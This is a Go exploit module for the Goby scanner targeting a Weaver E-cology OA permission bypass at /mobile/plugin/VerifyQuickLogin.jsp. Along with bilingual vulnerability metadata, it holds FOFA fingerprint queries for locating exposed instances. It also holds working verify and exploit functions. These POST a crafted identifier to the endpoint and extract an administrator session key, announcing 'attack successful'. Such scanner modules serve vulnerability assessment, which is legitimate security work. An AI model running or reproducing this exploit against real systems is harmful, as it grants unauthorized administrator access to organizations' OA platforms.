package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Weaver E-cology /mobile/plugin/VerifyQuickLogin.jsp permission bypass vulnerability",
    "Description": "<p>Weaver e-cology is an OA platform for large and medium-sized organizations.</p><p>Weaver e-cology has an arbitrary administrator user login vulnerability. An attacker can use the interface in the system to quickly log in to the administrator user, obtain the corresponding management permissions of the user, and can use the user's identity to perform malicious operations.</p>",
    "Impact": "<p>Weaver e-cology has an arbitrary administrator user login vulnerability. Attackers can use the interface in the system to quickly log in to the administrator user, obtain the corresponding management rights of the user, and use the user identity to perform malicious operations.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.weaver.com.cn/cs/securityDownload.html\">https://www.weaver.com.cn/cs/securityDownload.html</a></p>",
    "Product": "Weaver-Ecology",
    "VulType": [
        "Permission Bypass"
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "Translation": {
        "CN": {
            "Name": "泛微 E-cology /mobile/plugin/VerifyQuickLogin.jsp 权限绕过漏洞",
            "Product": "泛微-协同办公OA",
            "Description": "<p>泛微 e-cology 是一款面向大中型组织的OA平台。<br></p><p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\"><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">低版本泛微&nbsp;</span></span><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">e-cology 存在任意管理员用户登陆漏洞，攻击者可以利用系统内的接口快速登陆管理员用户，获取用户对应的管理权限，并可以使用该用户身份执行恶意操作。</span><br></p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.weaver.com.cn/cs/securityDownload.html\">https://www.weaver.com.cn/cs/securityDownload.html</a></p>",
            "Impact": "<p>泛微 e-cology 存在任意管理员用户登陆漏洞，攻击者可以利用系统内的接口快速登陆管理员用户，获取用户对应的管理权限，并可以使用该用户身份执行恶意操作。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Weaver E-cology /mobile/plugin/VerifyQuickLogin.jsp permission bypass vulnerability",
            "Product": "Weaver-Ecology",
            "Description": "<p>Weaver e-cology is an OA platform for large and medium-sized organizations.</p><p>Weaver e-cology has an arbitrary administrator user login vulnerability. An attacker can use the interface in the system to quickly log in to the administrator user, obtain the corresponding management permissions of the user, and can use the user's identity to perform malicious operations.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:&nbsp;<a href=\"https://www.weaver.com.cn/cs/securityDownload.html\">https://www.weaver.com.cn/cs/securityDownload.html</a></p>",
            "Impact": "<p>Weaver e-cology has an arbitrary administrator user login vulnerability. Attackers can use the interface in the system to quickly log in to the administrator user, obtain the corresponding management rights of the user, and use the user identity to perform malicious operations.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "FofaQuery": "header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\"",
    "GobyQuery": "header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\"",
    "Author": "su18@javaweb.org",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2022-05-05",
    "References": [
        "https://www.weaver.com.cn/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.8",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.0",
    "PocId": "10479"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfg := httpclient.NewPostRequestConfig("/mobile/plugin/VerifyQuickLogin.jsp")
			cfg.FollowRedirect = false
			cfg.Timeout = 15
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "identifier=1&language=1&ipaddress=61.148.74.134"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "Set-Cookie: ecology_JSession") && strings.Contains(resp.Utf8Html, "{\"message\":\"1\",\"sessionkey\":\"") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cfg := httpclient.NewPostRequestConfig("/mobile/plugin/VerifyQuickLogin.jsp")
			cfg.FollowRedirect = false
			cfg.Timeout = 15
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.Data = "identifier=1&language=1&ipaddress=1.1.1.1"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 && strings.Contains(resp.HeaderString.String(), "Set-Cookie: ecology_JSession") && strings.Contains(resp.Utf8Html, "{\"message\":\"1\",\"sessionkey\":\"") {
					expResult.Success = true
					expResult.Output = "攻击成功，请使用 sessionKey：\n" + regexp.MustCompile(`"sessionkey":"(.*?)"`).FindStringSubmatch(resp.RawBody)[1]
				}
			}
			return expResult
		},
	))
}
